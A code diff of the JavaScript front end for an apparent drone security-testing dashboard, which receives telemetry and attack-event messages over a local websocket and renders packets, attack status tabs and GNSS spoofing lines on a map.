+    ctx.fillStyle = fp.color; ctx.fill();
+    ctx.fillStyle = fp.color + 'cc';
+    ctx.font = '10px Courier New';
+    ctx.fillText(fp.label, cx + 7, cy + 4);
+    return fp.prog < 1;
+  });
+
+  requestAnimationFrame(drawFlow);
+}
+drawFlow();
+
+// ── WEBSOCKET ─────────────────────────────────────────────────────────────
+let ws, wsRetry;
+const dot   = document.getElementById('dot');
+const wsLbl = document.getElementById('ws-lbl');
+
 function connect() {
-  const wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  ws = new WebSocket(`${wsProto}//${location.host}/ws/attacker`);
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  ws = new WebSocket(`${proto}//${location.host}/ws/attacker`);
 
   ws.onopen = () => {
     dot.classList.add('on');
-    wsEl.textContent = '연결됨';
-    clearTimeout(retry);
+    wsLbl.textContent = '연결됨';
+    clearTimeout(wsRetry);
   };
 
   ws.onmessage = e => {
-    const pkt = JSON.parse(e.data);
-    if (pkt.type === 'packet') addPacket(pkt);
+    const msg = JSON.parse(e.data);
+    if      (msg.type === 'packet')          handlePacket(msg);
+    else if (msg.type === 'telemetry')       handleTelemetry(msg);
+    else if (msg.type === 'attack_event')    handleAttackEvent(msg);
   };
 
   ws.onclose = () => {
     dot.classList.remove('on');
-    wsEl.textContent = '재연결 중...';
-    retry = setTimeout(connect, 3000);
+    wsLbl.textContent = '재연결 중...';
+    wsRetry = setTimeout(connect, 3000);
   };
-
   ws.onerror = () => ws.close();
 }
 
-fetch('/api/drones').then(r => r.json()).then(data => {
-  const sel = document.getElementById('f-drone');
-  Object.keys(data).sort().forEach(id => {
+function handlePacket(pkt) {
+  addPacket(pkt, false);
+}
+
+function handleTelemetry(d) {
+  S.drones[d.drone_id] = d;
+  updateDroneMarker(d);
+  if (!document.querySelector(`#f-drone option[value="${d.drone_id}"]`)) {
     const opt = document.createElement('option');
-    opt.value = id;
-    opt.textContent = id;
-    sel.appendChild(opt);
-  });
-}).catch(() => {}).finally(connect);
+    opt.value = d.drone_id; opt.textContent = d.drone_id;
+    document.getElementById('f-drone').appendChild(opt);
+  }
+}
+
+function handleAttackEvent(msg) {
+  const {attack_id, drone_id, stage, detail, evidence} = msg;
+  S.attacks[attack_id] = {stage, detail, evidence};
+
+  const num = attack_id.startsWith('att01') ? 1
+            : attack_id.startsWith('att02') ? 2
+            : attack_id.startsWith('att03') ? 3 : 4;
+
+  appendLog(`atk-log-0${num}`, stage, detail);
+
+  addPacket({
+    drone_id, msg_name: `ATK-0${num} ${stage.toUpperCase()}`,
+    direction: 'up', hex: '',
+    fields: {detail: detail.substring(0,60)}
+  }, true);
+
+  const tab = document.querySelector(`.atk-tab[data-tab="att0${num}"]`);
+  if (tab) {
+    tab.classList.remove('running','success','fail');
+    if (stage==='start'||stage==='progress') tab.classList.add('running');
+    else if (stage==='success')              tab.classList.add('success');
+    else if (stage==='fail')                 tab.classList.add('fail');
+  }
+
+  if (['success','fail','stop'].includes(stage)) {
+    setAttackUI(num, false);
+    document.getElementById('active-attacks').style.display = 'none';
+    if (evidence && Object.keys(evidence).length) {
+      renderEvidence(attack_id, evidence);
+    }
+  } else {
+    document.getElementById('active-attacks').style.display = 'block';
+    if (evidence && Object.keys(evidence).length) {
+      renderEvidence(attack_id, evidence);
+    }
+  }
+
+  // Update GNSS spoof line on map
+  if (attack_id.startsWith('att02') && evidence?.spoof_lat) {
+    const real = S.drones[drone_id];
+    if (real) {
+      if (spoofLines[drone_id]) {
+        spoofLines[drone_id].setLatLngs([[real.lat, real.lon], [evidence.spoof_lat, evidence.spoof_lon]]);
+      } else {
+        spoofLines[drone_id] = L.polyline(
+          [[real.lat,real.lon],[evidence.spoof_lat,evidence.spoof_lon]],
+          {color:'#e05555', weight:2, dashArray:'4,4'}
+        ).addTo(map);
+      }
+    }
+  }
+}
+
+// Init
+fetch('/api/drones')
+  .then(r => r.json())
+  .then(data => {
+    Object.keys(data).sort().forEach(id => {
+      if (!document.querySelector(`#f-drone option[value="${id}"]`)) {
+        const opt = document.createElement('option');
+        opt.value = id; opt.textContent = id;
+        document.getElementById('f-drone').appendChild(opt);
+      }
+    });
+  })
+  .catch(() => {})
+  .finally(() => connect());
 </script>
 </body>
 </html>
